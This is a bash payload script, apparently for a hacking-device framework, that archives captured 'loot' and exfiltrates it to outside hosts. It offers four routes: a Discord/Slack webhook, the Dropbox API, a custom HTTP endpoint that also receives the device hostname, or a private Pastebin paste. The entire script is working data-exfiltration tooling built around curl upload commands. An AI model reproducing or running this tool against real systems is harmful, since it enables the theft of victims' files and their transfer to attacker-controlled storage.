#!/bin/bash
# Title: Cloud Exfil
# Author: NullSec
# Description: Exfiltrates captured loot to cloud storage endpoints
# Category: nullsec/exfiltration

LOOT_DIR="/mmc/nullsec/cloudexfil"
mkdir -p "$LOOT_DIR"

PROMPT "CLOUD EXFIL

Upload captured loot to
cloud storage for safe
retrieval.

Supports:
- Webhook (Discord/Slack)
- Dropbox API
- Custom HTTP endpoint
- Pastebin

Press OK to configure."

# Check connectivity
if ! ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1; then
    ERROR_DIALOG "No internet connection!

Cloud exfil requires an
active WAN uplink.
Check your connection."
    exit 1
fi

LOG "Internet connectivity confirmed"

PROMPT "UPLOAD METHOD:

1. Webhook (Discord/Slack)
2. Dropbox API
3. Custom HTTP POST
4. Pastebin

Select method next."

METHOD=$(NUMBER_PICKER "Method (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) METHOD=1 ;; esac
[ "$METHOD" -lt 1 ] && METHOD=1
[ "$METHOD" -gt 4 ] && METHOD=4

ENDPOINT=$(TEXT_PICKER "Endpoint URL:" "https://hooks.slack.com/services/xxx")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) ENDPOINT="" ;; esac

[ -z "$ENDPOINT" ] && { ERROR_DIALOG "No endpoint specified!

An upload URL is required."; exit 1; }

# Optional API key for Dropbox/Pastebin
API_KEY=""
if [ "$METHOD" -eq 2 ] || [ "$METHOD" -eq 4 ]; then
    API_KEY=$(TEXT_PICKER "API Key/Token:" "")
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) API_KEY="" ;; esac
    [ -z "$API_KEY" ] && { ERROR_DIALOG "API key required for
this upload method."; exit 1; }
fi

PROMPT "LOOT SOURCE:

1. All /mmc/nullsec/ loot
2. Latest session only
3. Specific payload loot
4. Custom path

Select source next."

SOURCE=$(NUMBER_PICKER "Source (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SOURCE=1 ;; esac

case $SOURCE in
    1) LOOT_PATH="/mmc/nullsec" ;;
    2) LOOT_PATH=$(ls -dt /mmc/nullsec/*/session_* 2>/dev/null | head -1)
       [ -z "$LOOT_PATH" ] && LOOT_PATH="/mmc/nullsec" ;;
    3) PAYLOAD_NAME=$(TEXT_PICKER "Payload name:" "datavacuum")
       LOOT_PATH="/mmc/nullsec/$PAYLOAD_NAME" ;;
    4) LOOT_PATH=$(TEXT_PICKER "Custom path:" "/mmc/nullsec") ;;
esac

[ ! -d "$LOOT_PATH" ] && { ERROR_DIALOG "Loot path not found!

$LOOT_PATH does not exist."; exit 1; }

LOOT_SIZE=$(du -sh "$LOOT_PATH" 2>/dev/null | awk '{print $1}')
FILE_COUNT=$(find "$LOOT_PATH" -type f 2>/dev/null | wc -l | tr -d ' ')

resp=$(CONFIRMATION_DIALOG "START EXFIL?

Source: $LOOT_PATH
Files: $FILE_COUNT
Size: $LOOT_SIZE
Method: $METHOD
Endpoint: ${ENDPOINT:0:30}...

Press OK to upload.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
ARCHIVE="/tmp/exfil_$TIMESTAMP.tar.gz"
UPLOAD_LOG="$LOOT_DIR/upload_$TIMESTAMP.log"

LOG "Compressing loot from $LOOT_PATH"
SPINNER_START "Compressing loot..."
tar czf "$ARCHIVE" -C "$(dirname "$LOOT_PATH")" "$(basename "$LOOT_PATH")" 2>/dev/null
SPINNER_STOP

ARCHIVE_SIZE=$(du -sh "$ARCHIVE" 2>/dev/null | awk '{print $1}')
LOG "Archive created: $ARCHIVE_SIZE"

SPINNER_START "Uploading to cloud..."
UPLOAD_OK=0

case $METHOD in
    1) # Webhook
        RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
            -F "file=@$ARCHIVE" \
            -F "content=NullSec Exfil $(date)" \
            "$ENDPOINT" 2>&1)
        [ "$RESULT" -ge 200 ] && [ "$RESULT" -lt 300 ] && UPLOAD_OK=1
        ;;
    2) # Dropbox
        RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST "$ENDPOINT" \
            -H "Authorization: Bearer $API_KEY" \
            -H "Content-Type: application/octet-stream" \
            -H "Dropbox-API-Arg: {\"path\":\"/exfil_$TIMESTAMP.tar.gz\"}" \
            --data-binary "@$ARCHIVE" 2>&1)
        [ "$RESULT" -ge 200 ] && [ "$RESULT" -lt 300 ] && UPLOAD_OK=1
        ;;
    3) # Custom HTTP POST
        RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST "$ENDPOINT" \
            -F "file=@$ARCHIVE" \
            -F "hostname=$(cat /proc/sys/kernel/hostname)" \
            -F "timestamp=$TIMESTAMP" 2>&1)
        [ "$RESULT" -ge 200 ] && [ "$RESULT" -lt 300 ] && UPLOAD_OK=1
        ;;
    4) # Pastebin (text files only, splits)
        TEXT_DATA=$(find "$LOOT_PATH" -name "*.txt" -o -name "*.log" | head -5 | xargs cat 2>/dev/null | head -c 50000)
        RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST "https://pastebin.com/api/api_post.php" \
            -d "api_dev_key=$API_KEY" \
            -d "api_option=paste" \
            -d "api_paste_private=1" \
            --data-urlencode "api_paste_code=$TEXT_DATA" 2>&1)
        [ "$RESULT" -ge 200 ] && [ "$RESULT" -lt 300 ] && UPLOAD_OK=1
        ;;
esac

SPINNER_STOP

# Cleanup temp archive
rm -f "$ARCHIVE"

# Log result
echo "[$TIMESTAMP] Method=$METHOD Upload=$([ $UPLOAD_OK -eq 1 ] && echo OK || echo FAIL) Files=$FILE_COUNT Size=$LOOT_SIZE" >> "$UPLOAD_LOG"

if [ "$UPLOAD_OK" -eq 1 ]; then
    LOG "Cloud exfil successful"
    PROMPT "EXFIL COMPLETE

Upload: SUCCESS
Files: $FILE_COUNT
Archive: $ARCHIVE_SIZE
Method: $METHOD

Log: $UPLOAD_LOG"
else
    LOG "Cloud exfil FAILED"
    ERROR_DIALOG "UPLOAD FAILED

HTTP response: $RESULT
Check endpoint URL and
API credentials.

Log: $UPLOAD_LOG"
fi
